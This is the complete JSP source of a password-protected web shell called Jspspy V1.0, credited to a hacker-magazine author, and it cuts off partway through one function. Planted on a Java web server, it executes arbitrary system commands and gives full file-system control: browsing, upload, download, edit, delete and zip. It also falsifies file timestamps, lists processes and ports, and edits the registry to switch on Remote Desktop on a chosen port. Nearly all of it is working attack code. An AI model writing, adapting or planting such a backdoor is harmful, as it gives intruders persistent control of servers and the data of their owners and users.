<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->
<HTML><HEAD><TITLE>※Jspspy web~shell V1.0 ※MADE by 孤水绕城 QQ:540410588※</TITLE>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<META content="孤水绕城Jspy web~shell" name=GENERATOR></HEAD>
<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*"%>
<%@ page import="java.util.Map"%>
<%@ page import="java.util.HashMap"%>
<%@ page import="java.nio.charset.Charset"%>
<%@ page import="java.util.regex.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.util.zip.*"%>
<%@ page import="javax.servlet.jsp.*"%>
<%@ page import="java.lang.reflect.*"%>
<%@ page import="java.net.*"%>
<%@ page import="java.util.Date"%>
<%@ page import="java.text.*"%>
<%
	final String passWord="jspspy"; 
	final String nowURI=request.getRequestURI();
	final String webSite_Folder = convertPath(application.getRealPath("/"));
	final String AbsPath=application.getRealPath(request.getRequestURI());
	File file = new File(AbsPath);
	String strAbsPath = file.getParent();
	session.setMaxInactiveInterval(6000);
	if(session.getAttribute("login")==null){
		if(request.getParameter("pass")!=null&&request.getParameter("pass").equals(passWord)){
			session.setAttribute("login",passWord);
			response.sendRedirect(nowURI);
		}
		else{
			out.print("<body scroll=no bgcolor=#000000><Center style=font-size:13px><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><span style='color:#ffffff'>JspSpy V1.0 <br><br><a href='http://www.nohack.cn' style=\"color:white;\" target='_blank'>※黑客手册专版※</a></span><form method='post'><span style='color:#ffffff'>输入密码：</span><input name='pass' type='password' size='22'> <input type='submit' value='登陆'><br><br><br><font color=#3399FF></font><br></div><body>");
		}
		return;
	}

%>
<%!

public static String encodeHTML(String str){
		String retStr = "";	
		retStr = str.replaceAll(" ","&nbsp;");
		retStr = str.replaceAll("<","&lt;");
		retStr = str.replaceAll(">","&gt;");
		retStr= str.replaceAll("\n","<br/>");
		retStr = str.replaceAll("\n\r","<br>");
		str.replaceAll("&","&amp;");		
 
	return retStr;
}
public String strCut(String str, int len) {
	String sRet;
	//it's explame
	len -= 3;
	
	if (str.getBytes().length <= len) {
		sRet = str;
	} else {
		try {
			sRet = (new String(str.getBytes(), 0, len, "GBK")) + "...";
		} catch (Exception e) {
			sRet = str;
		}
	}
	
	return sRet;
}
String encodeChange(String str)throws Exception{
    if(str==null)
        return null;
    else
        return new String(str.getBytes("ISO-8859-1"),"gb2312");
}
String encodeGb2Unicode(String str)throws Exception{
    if(str==null)
        return null;
    else
        return new String(str.getBytes("gb2312"),"ISO-8859-1");
}
public String  convertPath(String path){
	String retStr="";
	if(empchk(path)){
		path = path.replace('\\','/');
		File file = new File(path);
		
			if(file.isDirectory()){
				if(!path.endsWith("/")){
					path += "/";
				}
			}						
	}
	retStr += path;
	return retStr;
	
}
public boolean empchk(String str){

	if(str==null&&str==""&&(str.trim()).equals("")){
		return false;
	}
	else 
		return true;
}

public void outP(JspWriter out,String str) throws Exception{
	if(empchk(str)){
		out.print(str);
	}
	
}
//输出空格
public void outE(JspWriter out,int n) throws Exception{
	if(n>0){
		for(int i=0;i<n;i++){
			out.print("&nbsp");
		}
	}
}
public String sacnRead(String path){
	File file = new File(path);
	if(file.canRead()){
		return "<font face=wingdings size=4>&#252;</font>";
	}
	else{ 
		return "<font face=wingdings size=4>&#251;</font>";
	}
}
public String sacnWrite(String path){
	File file = new File(path);
	if(file.canWrite()){
		return "<font face=wingdings size=4>&#252;</font>";
	}
	else{ 
		return "<font face=wingdings size=4>&#251;</font>";
	}
}
public String sacnHidden(String path){
	File file = new File(path);
	if(file.isHidden()){
		return "<font face=wingdings size=4>&#252;</font>";
	}
	else{ 
		return "<font face=wingdings size=4>&#251;</font>";
	}
}
public String getSize(String path){
	File file = new File(path);
	long size = file.length();
    if(size>=1024*1024*1024){
        return new Long(size/1073741824L)+"G";
    }else if(size>=1024*1024){
        return new Long(size/1048576L)+"M";
    }else if(size>=1024){
        return new Long(size/1024)+"K";
    }else
        return size+"B";
}
public String getLastModified(String path) throws Exception{
	SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 
	File file = new File(path);
	Date time =new Date(file.lastModified());
	 //Date now=new Date();
	 String str_date1 = formatter.format(time); //将日期时间格式化 
	 return str_date1;
}
public void mainForm(JspWriter out,String webSite_Folder) throws Exception{
	out.print("<table width=100% height=100% border=0 bgcolor=menu>");
    out.print("<tr><td height=30 colspan=2>");
    out.print("<table width=100% height=25 border=0>");
    out.print("<form name=address method=post target=FileFrame onSubmit='checkUrl();'>");
    out.print("<tr><td width=60 align=center>FilePath:</td><td>");
    out.print("<input name=FolderPath type=text style=\"width:100%\" value='"+webSite_Folder+"'>");
    out.print("<input type=hidden name=action value=S>");
    out.print("<input type=hidden name=Filename><input type=hidden name = sFileName>");
    out.print("</td><td width=100 align=center><a href=\"javascript:checkUrl();\">GOtoLink</a>"); 
    out.print("</td></tr></form></table></td></tr><tr><td width=148>");
    out.print("<iframe name=Menu src='?action=M' width=100% height=100% frameborder=2 scrolling=yes></iframe></td>");
    out.print("<td width=600>");
    out.print("<iframe name=FileFrame src='?action=S&FolderPath="+webSite_Folder+"' width=100% height=100% frameborder=1 scrolling=yes></iframe>");
    out.print("</td></tr></table>");
}
public void mainMenu(JspWriter out,String webSite_Folder,String strAbsPath) throws Exception{
	out.print("╬┅╬═══════════");
	out.print("<div align=\"center\" style=\"width: 100%; height:31; vertical-align:middle ;color: White ; position: relative; filter: glow(color=#00CCFF, strength=5)\"><font face=\"楷体_GB2312\" size=4>☆黑客手册专版☆</font> </div> ");
	out.print("═══════════╬┅╬");	
	listRoot(out);
	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+webSite_Folder+"\");'><B>〖站点根目录〗</B></A></TD></TR>\n");
	out.print("<TR><TD width=100% height=20><A href='javascript:JshowFolder(\""+convertPath(strAbsPath)+"\");'><B>〖本程序目录〗</B></A></TD></TR>\n");
	out.print("<TD height=20><A href='javascript:newFolder(\""+webSite_Folder+"\")'>〖新建目录〗</A></TD></TR><TR>\n");
	out.print("<TR><TD height=20><A href=\"?action=G\" target=FileFrame>〖新建文本〗</A></TD></TR>\n");
	out.print("<TR><TD height=20><A href=\"?action=q\" target=FileFrame>●查找<B>文件</B></A></TD></TR>");
	out.print("<TR><TD height=20><A href='?action=t' target=FileFrame>●上传<B>文件</TD></TR>");
	out.print("<TR><TD onmouseover=\"menu2.style.display=''\" height=22><B>+≤服务器端工具≥</B>\n");
	out.print("<div id=menu2 style=\"display:none; width:100%\" onmouseout=\"menu2.style.dispaly='none'\">");
	out.print("<a href='?action=U' target=FileFrame>〖系统参数〗</a><br>\n");
	out.print("<a href='?action=E' target=FileFrame>〖CMD命令〗</a><br>\n");
	out.print("<a href='?action=w' target=FileFrame>〖终端工具〗</a><br>\n");
	out.print("<a href='?action=B&command=netstat' target=FileFrame>〖端口列表〗</a><br>\n");
	out.print("<a href='?action=Z&command=netstart' target=FileFrame>〖服务列表〗</a><br>\n");
	out.print("<a href='?action=Y&command=tasklist' target=FileFrame>〖进程列表〗</a><br>\n");
	out.print("<a href='?action=V' target=FileFrame>〖结束进程〗</a><br>\n");
	out.print("<a href='?action=x' target=FileFrame>〖注册表操作〗</a><br>\n");
	out.print("<a href='?action=A' target=FileFrame>〖jspy说明〗</a><br>\n");
	out.print("</div>");
}
void listRoot(JspWriter out){
  try{
		out.print("<TABLE cellSpacing=0 cellPadding=0 width=\"100%\">\n<TBODY>\n<TR>\n<TD	height=5></TD></TR>\n<TR><TD>");
		out.print("<CENTER><A href=\"\" target=_blank><FONT color=red></FONT></CENTER></A>");
		out.print("\n</TD></TR>\n<TR>");
		out.print("<td onMouseover=\"menu1.style.display=''\" width=100% height=22><B>+≤查看硬盘≥</B>>\n");
		out.print("<DIV id=\"menu1\" style=\"DISPLAY:none; onMouseout=menu1.style.display='none'\">\n");
		File[] roots=File.listRoots();
		for(int i=0;i<roots.length;i++){
			out.print("<A href='"+"javascript:JshowFolder(\""+convertPath(roots[i].getPath())+"\")'>本地磁盘："+roots[i].getPath()+"</A><br>\n");
				
		}
		out.print("</DIV></TD></TR>");
	}catch(Exception e){
	
	}
}
void loginOut(JspWriter out,String nowURI)throws Exception{
	//session.removeAttribute("login");
	//response.sendRedirect("iframe.jsp");
	out.print("gsrc");
	out.print("<meta http-equiv=\"refresh\" content=\"2;url=" + nowURI +"\" />\n");
}

public void listFolder(JspWriter out,String path) throws Exception{

	int j=0,p=0;int k,y=10000;
	path=convertPath(path);
	try{
		File file = new File(path);
		String[] sfiles = file.list();
		File[] files = new File[sfiles.length];
		String[] reFileName = new String[sfiles.length+1];
		String[] abFileName = new String[sfiles.length+1];
		k = sfiles.length+1;
		//out.print("数组的长度为"+reFileName.length);
		for(int i=0;i<sfiles.length;i++){
			files[i] = new File(path+"/"+sfiles[i]);
			if(files[i].isDirectory()){
				reFileName[j]=(String)files[i].getName();	
				abFileName[p]=(String)convertPath(files[i].getAbsolutePath());	
				j++;
				p++;
			}
			else{
				reFileName[k-1] = (String)files[i].getName();
				abFileName[k-1] = (String)convertPath(files[i].getAbsolutePath());
				k--;
			}
		}	
		out.print("<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>");
		//out.print("<TBODY>");
		for(int i=0;i<sfiles.length;i++){
			if(abFileName[i]==null)
				y=i;
		}
		if(sfiles.length>0){
			//输出目录部分
			//out.print("<Tbody>\n");
			//out.print("");
			out.print("<tr><td align='left'>文件名称</td><td align='center'>类型</td><td align='center'>大小</td><td align='center'>可读</td><td align='center'>可写</td><td align='center'>隐藏</td><td align='center'>最后修改时间</td><td align='left'>相关操作</td></tr>");
			for(int i=0;abFileName[i]!=null;i++){	
				out.print("<tr><td><a href='javascript:JshowFolder(\""+abFileName[i]+"\");'>"+"<font face=\"wingdings\" size=6>&#48;</font>"+strCut(reFileName[i],30)+"</td><td>folder</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>移动&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>删除&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>编辑属性&nbsp;&nbsp;</a><a href='javascript:zipFile(\""+abFileName[i]+"\");'>打包&nbsp;&nbsp;</a></td></tr>");
			
			}
			//输出文件部分
			out.print("</tr>");
			
			for(int i=sfiles.length;reFileName[i]!=null;i--){
				out.print("<tr><td><a href='javascript:JshowFile(\""+reFileName[i]+"\")'>"+"<font face=\"wingdings\" size=5>&#50;</font>"+strCut(reFileName[i],30)+"</td><td>file</td><td>"+getSize(abFileName[i])+"</td><td>"+sacnRead(abFileName[i])+"</td><td>"+sacnWrite(abFileName[i])+"</td><td>"+sacnHidden(abFileName[i])+"</td><td>"+getLastModified(abFileName[i])+"</td><td><a href='javascript:JsReName(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>移动&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+abFileName[i]+"\");'>删除&nbsp;&nbsp;</a><a href='javascript:setDate(\""+abFileName[i]+"\")'>编辑属性&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+abFileName[i]+"\",\""+abFileName[i]+"\");'>复制&nbsp;&nbsp;</a><a href='?action=H&fileName="+abFileName[i]+"'>编辑&nbsp;&nbsp;</a><a href='javascript:downFIle(\""+abFileName[i]+"\");'>下载&nbsp;&nbsp;</a></td></tr>");
			}
			out.print("</table>");
		}
		
		//out.print(y);
		
		
	}
	catch(Exception e){
	}
}

public void pExeCmd(JspWriter out,HttpServletRequest request) throws Exception{

	out.print("<table class=\"ta\" align=\"center\" border=0 width=100%  bgcolor=black>\n");
	out.print("<form><tr><td width=\"10%\">输入命令：</td><td><input style=\"width:100%; height:23\"type=text  name=cmd value=\"net user\">&nbsp&nbsp&nbsp<td width=\"10%\"><input style=\"height:23;width:100%;background-color:#FFFFFF;border:0px\"type=submit value=提交></td><td><input type=hidden name=action value=E></td><tr>\n");
	out.print("<tr><td colspan=3><TEXTAREA style=\"width:100%;background-color:#FF80FF ;height=100%\">"+exeCmd(out,request.getParameter("cmd"))+"</TEXTAREA></td></tr>\n");
	out.print("</form>");
	out.print("</table>");
}
public String exeCmd(JspWriter out,String cmd) throws Exception{
	String rStr = "";
 if(empchk(cmd)){
	
	int nRet;
	InputStreamReader in = null;
	Runtime run = Runtime.getRuntime();
	Process pro = null;
	char[] tmpChar = new char[1024];
	try{
		 
		pro = run.exec(cmd);
		in = new InputStreamReader(pro.getInputStream(),Charset.forName("GB2312"));
		while((nRet = in.read(tmpChar,0,1024))!=-1){
			rStr += new String(tmpChar,0,nRet);
		}
		
	}catch(Exception e){
		
		
	}
	finally {
		in.close();
		return rStr;
	}
 }
 else
	 return "empty";
}
public void newFolder(JspWriter out,String nFolder)throws Exception{
	if(empchk(nFolder)){
	   File file = new File(nFolder);  
	   if(file.exists()){
			out.print("<script>alert(\"目录已经存在!\");</script>");
	   }
	   else{
			if(file.mkdir()){
				out.print("<script>alert(\":-)目录建立成功!\");</script>");
				//out.print("目录建立成功");
			}
			else{
				out.print("<script>alert(\"目录建立失败!\");</script>");
			}
	   }
	}
} 
public void pnewFile(JspWriter out,String nFile,String webSite_Folder) throws Exception{

	out.print("<table align=\"center\" border=0 width=100%  bgcolor=black>\n");
	out.print("<form method=post action=\"?action=g&choice=r\"><tr><td style=\"width:10%;height:23\">绝对路径：</td><td><input style=\"width:100%; height:23\"type=text  name=fileName value=\""+webSite_Folder+"\"></td></td><td></td><tr>\n");
	out.print("<tr><td colspan=2><TEXTAREA name=fileContent style=\"width:100%;background-color:#FF80FF ;height=400\">"+nFile+"</TEXTAREA></td></tr>\n");
	out.print("<br><hr><tr><td colspan=2><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></td></tr>");
	out.print("</form>");
	out.print("</table>");
} 

//
public void newFile(JspWriter out,String path,byte[] content,String choice) throws Exception{
	
		File file = new File(path);
	    if(choice.equals("r")&&file.exists()){
			out.print("☆孤水绕城☆友情提示:<br><br>文件已经存在! 换个名字吧!");
			return;	
	    }
	   else{
			BufferedOutputStream bos = null;
			try{
				bos = new BufferedOutputStream(new FileOutputStream(path));
				bos.write(content,0,content.length);
				out.print("文件保存成功！<br><br>绝对路径为：");
				out.print(path);
			}catch(Exception e){
			
			}
			finally{
				if(out!=null){
					bos.close();
				}
			}		
		}
	
}
public void pupfile(JspWriter out,String path) throws Exception{
	out.print("<table class=\"ta\" width='100%'> ");
	out.print("<form method=post enctype='multipart/form-data' action='?action=T'> ");
	out.print("<tr><td width='40%'>所在的路径为:"+path+"</td><td width='40%'><input style='width:90%' type=file name=file value='浏览'></td><td width='20%'><input type=submit value=上传 style='background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;'></td></tr>");
	out.print("</from>");
	out.print("</table>");
}
public void uploadFile(JspWriter out,ServletRequest request, String path) throws Exception{
	String sRet = "";
	File file = null;
	InputStream in = null;
	
	path = convertPath(path);
	
	try {
		in = request.getInputStream();
		
		byte[] inBytes = new byte[request.getContentLength()];
		int nBytes;
		int start = 0;
		int end = 0;
		int size = 1024;
		String token = null;
		String filePath = null;

		//
		// 把输入流读入一个字节数组
		//
		while ((nBytes = in.read(inBytes, start, size)) != -1) {
			start += nBytes;
		}
		
		in.close();
		//
		// 从字节数组中得到文件分隔符号
		//
		int i = 0;
		byte[] seperator;
		
		while (inBytes[i] != 13) {
			i ++;
		}
		
		seperator =  new byte[i];
	
		for (i = 0; i < seperator.length; i ++) {
			seperator[i] = inBytes[i];
		}
		
		//
		// 得到Header部分
		//
		String dataHeader = null;
		i += 3;
		start = i;
		while (! (inBytes[i] == 13 && inBytes[i + 2] == 13)) {
			i ++;
		}
		end = i - 1;
		dataHeader = new String(inBytes, start, end - start + 1);
		
		//
		// 得到文件名
		//
		token = "filename=\"";
		start = dataHeader.indexOf(token) + token.length();
		token = "\"";
		end = dataHeader.indexOf(token, start) - 1;
		filePath = dataHeader.substring(start, end + 1);
		filePath = 	convertPath(filePath);
		String fileName = filePath.substring(filePath.lastIndexOf("/") + 1);
		
		//
		// 得到文件内容开始位置
		//	
		i += 4;
		start = i;	
		//
		// 偷懒的办法
		//
		end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;
		
		//
		// 保存为文件
		//
		File newFile = new File(path + fileName);
		newFile.createNewFile();
		FileOutputStream fos = new FileOutputStream(newFile);
		out.print("☆孤水绕城☆友情提示:<br><br>文件路径为："+newFile);
		//out.write(inBytes, start, end - start + 1);
		fos.write(inBytes, start, end - start + 1);
		fos.close();
		sRet = fileName;
		sRet = "<script language=\"javascript\">\n";
		sRet += "alert(\"文件上传成功:" + fileName + "\");\n";
		sRet += "</script>\n";
	} catch (IOException e) {
		  sRet = "<script language=\"javascript\">\n";
		  sRet += "alert(\"文件上传失败\");\n";
		  sRet += "</script>\n";
	}
	
	out.print(sRet);
}
//以p开头的函数均为界面构造函数
public void peditFile(JspWriter out,String nFile) throws Exception{

	out.print("<table align=\"center\" border=0 width=100%  bgcolor=black>\n");
	out.print("<form method=post action=\"?action=g&choice=w\"><tr><td style=\"width:10%;height:23\">绝对路径：</td><td><input style=\"width:100%; height:23\"type=text  name=fileName value=\""+nFile+"\"></td></td><td><input type=hidden name=action value=E></td><tr>\n");
	out.print("<tr><td colspan=2><TEXTAREA name=fileContent style=\"width:100%;background-color:#FF80FF ;height=400\">"+editFile(out,nFile)+"</TEXTAREA></td></tr>\n");
	out.print("<br><hr><tr><td colspan=2><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></td></tr>");
	out.print("</form>");
	out.print("</table>");
} 
public String editFile(JspWriter out,String path) throws Exception {
	out.print(path);
	File file = new File(path);
	String strRet = "";
	 if(file.exists()&&file.length()>0){
		
		int nRet ;
		BufferedInputStream bis = null;
		byte[] tmpChar= new byte[1024];
		//FileInputStream in = null;
		try{
			bis = new BufferedInputStream(new FileInputStream(path));
			while((nRet=bis.read(tmpChar,0,1024))!=-1){
				strRet += new String(tmpChar,0,nRet);
				strRet = encodeHTML(strRet);
			}
		}catch(Exception e){
			strRet += "error";
		}
		finally{
			if(bis != null){
				bis.close();
			}
		}
	}
	return strRet;
}
public void reName(JspWriter out,String sPath,String dpath) throws Exception{
	if(empchk(sPath)&&empchk(dpath)){
		File dfile = new File(dpath);
		File sfile = new File(sPath);
		if(dfile.exists()){
			out.print("友情提示！\n该文件已经存在！！！");
		}
		else{
			if(sfile.renameTo(dfile)){
				out.print("☆孤水绕城☆友情提示:<br><br>移动成功！");
			}
		}
	}

}
public void delName(JspWriter out,String spath) throws Exception{
	if(empchk(spath)){
		File file = new File(spath);
		if(file.delete()){
			out.print("☆孤水绕城☆友情提示:<br><br>删除成功！");
		}
	}
}
public void copyName(JspWriter out,String spath,String dpath) throws Exception{
	if(empchk(spath)&&empchk(dpath)){
		String retStr="";
		File sfile = new File(spath);
		File dfile = new File(dpath);	
		if(dfile.exists()){
				out.print("☆孤水绕城☆友情提示:<br><br>该文件已经存在！");
		}
		else{
				FileInputStream fis = new FileInputStream(sfile);
				FileOutputStream fos = new FileOutputStream(dfile);
				int nRet;
				byte[] tempByte = new byte[1024];
				try{
				    while((nRet=fis.read(tempByte,0,1024))!=-1){
					fos.write(tempByte,0,nRet);
				}
			out.print("☆孤水绕城☆友情提示:<br><br>文件复制成功！");
		}catch(Exception e){
		
		}
		finally{
			fis.close();
			fos.close();
		}
	 }
	}
}

public void downFile(String filePath,HttpServletResponse res) throws Exception{
	int nRet;
	byte[] buffer=new byte[256];
	if(empchk(filePath)){
		ServletOutputStream sos = res.getOutputStream();
		BufferedInputStream bis = null;
		String fName= encodeGb2Unicode((new File(filePath)).getName());		
		res.reset();
		res.setHeader("Content-disposition","attachment;filename=\""+fName+"\"");
		try{
			bis = new BufferedInputStream(new FileInputStream(filePath));
			while((nRet=bis.read(buffer,0,buffer.length))!=-1){
				sos.write(buffer,0,nRet);
			}
		}
		catch(Exception e){		
		}
		finally{
			sos.close();
			bis.close();
		}
	}
}

void zip(JspWriter out,String sPath, String dpath) throws Exception {
    FileOutputStream output = null;
    ZipOutputStream zipOutput = null;
    try{
        output = new FileOutputStream(dpath);
        zipOutput = new ZipOutputStream(output);
        zipEntry(zipOutput,sPath,sPath,dpath);
    }catch(Exception e){
        out.print("file zip error");
    }finally{
        if(zipOutput!=null)zipOutput.close();
    }
    out.print("zip ok"+dpath);
}
//add the zip entry
void zipEntry(ZipOutputStream zipOs, String initPath,String filePath,String zipPath) throws Exception {
    String entryName = filePath;
    File f = new File(filePath);
    if (f.isDirectory()){// check is folder
        String[] files = f.list();
        for(int i = 0; i < files.length; i++)
            zipEntry(zipOs, initPath, filePath + File.separator + files[i],zipPath);
        return;
    }
    String chPh = initPath.substring(initPath.lastIndexOf("/") + 1);// 
    int idx=initPath.lastIndexOf(chPh);
    if (idx != -1) {
        entryName = filePath.substring(idx);
    }
    ZipEntry entry;
    entry = new ZipEntry(entryName);
    File ff = new File(filePath);
    if(ff.getAbsolutePath().equals(zipPath))return;
    entry.setSize(ff.length());
    entry.setTime(ff.lastModified());
    //the CRC efficacy  
    entry.setCrc(0);
    CRC32 crc = new CRC32();
    crc.reset();
    zipOs.putNextEntry(entry);
    int len = 0;
    byte[] buffer = new byte[2048];
    int bufferLen = 2048;
    FileInputStream input =null;
    try{
        input = new FileInputStream(filePath);
        while ((len = input.read(buffer, 0, bufferLen)) != -1) {
                zipOs.write(buffer, 0, len);
                crc.update(buffer, 0, len);
        }
    }catch(Exception e){
    }finally{
        if(input!=null)input.close();
    }
    entry.setCrc(crc.getValue());
}


public void pfindFile(JspWriter out,HttpServletRequest request) throws Exception{
		out.print("<br>网站根目录："+request.getRealPath("/")+"<br>");	
		out.print("<FORM name=form1 action=?action=Q method=post>\n<P><B>填入你要搜索的文件名称：</B>\n<INPUT style=\"BORDER-RIGHT: #999 1px solid; BORDER-TOP: #999 1px solid; BORDER-LEFT: #999 1px solid; BORDER-BOTTOM: #999 1px solid\" size=30 value=index.jsp name=filename>\n注：只填写文件名称(区分大小写)<BR>\n查找文件范围: \n <INPUT class=c  type=radio checked value='");
		out.print(convertPath(request.getRealPath("/")));
		out.print("' name=radiobutton>网站根目录搜索");
	
		File[] roots=File.listRoots();
		for(int i=0;i<roots.length;i++){
			out.print("<INPUT class=c type=radio  value="+convertPath(roots[i].getPath())+" name=radiobutton>"+roots[i].getPath());
		}
		out.print("<br><br>");
		out.print("<input type=\"submit\" value=\" 开始扫描 \" style=\"background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;\" />");
}
public void  findFile(JspWriter out,String path,String filename)throws Exception{
	
			File file = new File(path);
			File[] list = file.listFiles();
			String dfileName = filename ;
			
		try{			
			
			for(int i=0;i<list.length;i++){
				if(list[i].isDirectory()){
					findFile(out,list[i].getPath(),dfileName);
				}
				else if(list[i].isFile()){
					if(list[i].getName().equals(dfileName)){
						out.print("<table width='100%' border=0> ");
						out.print("<tr><td width='60%'>"+strCut(convertPath(list[i].getPath()),70)+"</td><td width='40%'><a href='javascript:JsReName(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>移动&nbsp;&nbsp;</a><a href='javascript:JsCoypFile(\""+convertPath(list[i].getPath())+"\",\""+convertPath(list[i].getPath())+"\");'>复制&nbsp;&nbsp;</a><a href='?action=H&fileName="+convertPath(list[i].getPath())+"'>编辑&nbsp;&nbsp;</a><a <a href='?action=O&fileName="+convertPath(list[i].getPath())+"'>下载&nbsp;&nbsp;</a><a href='javascript:JsdelName(\""+convertPath(list[i].getPath())+"\");'>删除&nbsp;&nbsp;</a><a href='javascript:setDate(\""+convertPath(list[i].getPath())+"\")'>编辑属性&nbsp;&nbsp;</a></td></tr>");
						out.print("</table>");
					}
			
				}
				
			}
		
		}catch(Exception e){
			
		}finally {
			
		}
}
public void dateChange(String filename,String year,String month,String day,JspWriter out)throws IOException{
    File f=new File(filename);
    if(f.exists()){
        Calendar calendar=Calendar.getInstance();
        calendar.set(Integer.parseInt(year),Integer.parseInt(month),Integer.parseInt(day));
        if(f.setLastModified(calendar.getTimeInMillis()))
            out.print("☆孤水绕城☆友情提示:<br><br>"+filename+" change success");
        else
            out.print(filename+"file date change error");
    }else{
        out.println("file not find!!!");
    }
}
 public static String getWindowsMACAddress() {   
        String mac = null;   
        BufferedReader bufferedReader = null;   
        Process process = null;   
        try {   
            process = Runtime.getRuntime().exec("ipconfig /all");// windows下的命令，显示信息中包含有mac地址信息   
            bufferedReader = new BufferedReader(new InputStreamReader(process   
                    .getInputStream()));   
            String line = null;   
            int index = -1;   
            while ((line = bufferedReader.readLine()) != null) {   
                index = line.toLowerCase().indexOf("physical address");// 寻找标示字符串[physical address]   
                if (index >= 0) {// 找到了   
                    index = line.indexOf(":");// 寻找":"的位置   
                    if (index>=0) {   
                        mac = line.substring(index + 1).trim();//  取出mac地址并去除2边空格   
                    }   
                    break;   
                }   
            }   
        } catch (IOException e) {   
            e.printStackTrace();   
        } finally {   
            try {   
                if (bufferedReader != null) {   
                    bufferedReader.close();   
                }   
            } catch (IOException e1) {   
                e1.printStackTrace();   
            }   
            bufferedReader = null;   
            process = null;   
        }   
  
        return mac;   
    }   
public void systemInfo(JspWriter out,HttpServletRequest request) throws Exception{

	out.print("<table width=\"100%\" border=0>");
	out.print("<tr><td colspan=\"2\"><div align=\"left\">服务器信息</div></td> </tr>");
	//out.print("");
	out.print("<tr> <td width=\"19%\">服务器名称</td><td width=\"81%\">"+request.getServerName()+"</td></tr>");
	out.print("<tr><td>ip地址</td><td>"+InetAddress.getLocalHost().getHostAddress()+"</td></tr>");
	out.print("<tr><td>服务器端口</td><td>"+request.getServerPort()+"</td></tr>");
	out.print("<tr><td>操作系统</td><td>"+System.getProperty("os.name")+System.getProperty("os.version") + " " + System.getProperty("os.arch")+"</td></tr>");
	out.print("<tr><td>MAC地址</td><td>"+getWindowsMACAddress()+"</td></tr>");
	out.print("<tr> <td>当前用户名</td><td>"+System.getProperty("user.name")+"</td></tr> ");
	out.print("<tr> <td>当前用户目录</td><td>"+System.getProperty("user.home")+"</td></tr> ");
	out.print("<tr><td>当前用户工作目录</td><td>"+System.getProperty("user.dir")+"</td> </tr>");
	out.print("<tr><td>程序绝对路径</td><td>"+request.getRealPath(request.getServletPath())+"</td> </tr>");
	out.print("<tr><td>网络协议版本</td><td>"+request.getProtocol()+"</td></tr>");
	//out.print("<tr><td>服务器软件版本信息</td><td>"+application.getServerInfo()+"</td> </tr>");
	out.print("<tr><td>JDK版本</td><td>"+System.getProperty("java.version")+"</td> </tr>");
	out.print("<tr><td>JDK安装路径</td><td>"+System.getProperty("java.home")+"</td></tr>");
	out.print("<tr><td>JAVA虚拟机版本</td><td>"+System.getProperty("java.vm.specification.version")+"</td></tr> ");
	out.print("<tr><td>JAVA虚拟机名</td><td>"+System.getProperty("java.vm.name")+"</td></tr>");
	out.print("<tr><td>JAVA类路径</td><td>"+System.getProperty("java.class.path")+"</td></tr>");
	out.print("<tr><td>系统path变量</td><td>"+System.getProperty("java.library.path")+"</td> </tr>");
	out.print("<tr><td>JAVA临时目录</td><td>"+System.getProperty("java.io.tmpdir")+"</td></tr>");
	out.print("<tr> <td>扩展目录路径</td> <td>"+System.getProperty("java.ext.dirs")+"</td></tr>");
	out.print("</table> ");
}
//开启远程终端功能暂时只支持winXP和win2003
public String checkOs(){	
	return System.getProperty("os.name").toLowerCase();
}
public void popenTerm(JspWriter out) throws Exception{
	out.print("<TABLE align='center' width='50%'><TR><TD align='center'>操作系统版本</TD><td>"+checkOs()+"</td>");
	out.print("</TR><TR>");
	out.print("<form method=post action='?action=W'>");
	out.print("<TR><TD ><input type=radio name=terminal checked>win2003开启3389</TD><TD></TD></TR>");
	out.print("<TR><TD align='right'>终端端口号</TD><TD><INPUT type=text name=p1 size=10 value=3389></TD><TD><input type=submit value=\"开启终端\"></TD></TR>");
	out.print("<TR><TD ><input type=radio name=terminal >winXp</TD><TD></TD></TR>");
	out.print("<TD></TD>");
	out.print("</form></TR></TABLE>");

}
public void openTrem(JspWriter out,String port1) throws Exception{
	int j = Integer.parseInt(port1);
	
	String dtohex = Integer.toHexString(j);
	
	//out.print(hex2003);
	String openxpOr2003[] = new String[]{
		"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
		"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\" /v PortNumber /t REG_DWORD /d 0x"+dtohex+" /f",
		"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 0x"+dtohex+" /f"
	};

	if(checkOs().equals("windows xp")){
		for(int i=0;i<openxpOr2003.length;i++){
